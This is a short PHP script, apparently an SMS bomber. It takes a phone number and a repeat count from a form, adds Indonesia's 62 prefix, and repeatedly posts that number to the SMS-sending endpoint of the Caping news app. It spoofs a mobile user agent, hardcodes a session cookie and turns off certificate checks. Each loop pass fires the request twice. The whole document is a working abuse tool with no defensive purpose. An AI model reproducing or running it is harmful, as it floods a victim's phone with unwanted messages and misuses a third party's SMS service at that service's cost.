<?php

$no = $_POST["no"];
$body = '{"mobile":"62'.$no.'"}';
$loop = $_POST["loop"];
$x = 0;
while($x < $loop) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ai.caping.co.id/v2/sms/send");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$headers = array();
		$headers[] = "Content-Type: application/json";
		$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36;CapingNews/4.1.1";
		$headers[] = "Cookie: u=60120563;n=ffffffffa264cd10ffffffff8412e49e";
        $headers[] = "Host: ai.caping.co.id";
        $headers[] = "Connection: Keep-Alive";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
echo "Success Nganu <br> $body <br>";
curl_exec($ch);
$x++;
if(curl_exec($ch)){
    continue;
    }
}

?>